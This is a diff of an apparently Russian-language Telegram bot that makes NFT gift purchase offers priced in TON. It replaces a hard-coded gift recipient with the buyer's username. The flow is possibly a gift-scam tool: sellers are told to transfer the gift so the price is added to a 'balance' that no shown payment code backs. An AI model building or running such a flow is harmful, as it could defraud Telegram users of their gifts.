@@ -45,9 +45,7 @@ TON_WALLET = os.getenv("TON_WALLET", "UQ_ТВОЙ_АДРЕС_TON")
 ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
 USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")
 
-# ===== Кому отправлять подарок (НФТ) при нажатии "Передать" =====
-GIFT_RECIPIENT = "mindly_offer"
-
+# ===== Глобальные переменные =====
 router = Router()
 COMMAND_REGEX = re.compile(r"^купить\s+(.*)$", re.IGNORECASE)
 GIFT_EMOJI_HTML = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
@@ -196,7 +194,7 @@ async def safe_edit_message_text(
             logging.info(f"Edit FLOOD_WAIT ({wait_time}s).")
             await asyncio.sleep(wait_time)
         except Exception as e:
-            logging.warning(f"Edit failed (попытка {attempt + 1}/{max_retries}): {e}")
+            logging.debug(f"Edit failed: {e}")
             if attempt == max_retries - 1:
                 raise
             await asyncio.sleep(1)
@@ -223,7 +221,7 @@ def offer_text(offer: Offer) -> str:
     cur = offer.currency
     ttl = TTL_HOURS
     gift = offer.gift_link
-
+    
     nbsp = "\u00A0"
 
     if offer.lang == "en":
@@ -289,10 +287,10 @@ def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
         "zh": "转赠",
         "ar": "إرسال",
     }.get(offer.lang, "Передать")
-
-    # Кнопка открывает того, кто отправил оффер
+    
+    # Адаптация на того, кто отправил оффер (buyer_username)
     recipient = offer.buyer_username
-
+    
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=transfer_label, url=f"tg://send_gift?to={recipient}")],
     ])
@@ -340,8 +338,8 @@ def accept_alert_text(offer: Offer) -> str:
             f"تم قبول عرض بيع {gift_name} بنجاح.\n\n"
             f"قم بتحويل الهدية إلى {buyer_handle} لإضافة {offer.price} {currency} إلى رصيدك."
         )
-
-    # Если ссылки не было, gift_name равно "подарок". Меняем на "подарка".
+    
+    # Русский язык: обрабатывается "подарок" -> "подарка"
     if not gift_name or gift_name == "подарок":
         display_gift = "подарка"
     else:
@@ -589,7 +587,7 @@ async def create_offer(message: Message, bot: Bot) -> None:
         buyer = message.from_user
         if not buyer:
             return
-
+            
         buyer_id = buyer.id
         buyer_username = buyer.username if buyer.username else str(buyer.id)
         buyer_name = (
@@ -669,15 +667,14 @@ async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
         offers.pop(offer_id, None)
         await callback.answer("Отклонено.")
     else:
-        # 1. Редактируем СТАРОЕ сообщение (без отправки нового)
         text = sold_text(offer)
         await safe_edit_message_text(
             bot, text, offer.chat_id, offer.message_id,
             offer.connection_id, sold_keyboard(offer)
         )
         offers.pop(offer_id, None)
-
-        # 2. Всплывающее окно (Alert)
+        
+        # Показать всплывающее окно с деталями продажи
         await callback.answer(accept_alert_text(offer), show_alert=True)
 
 
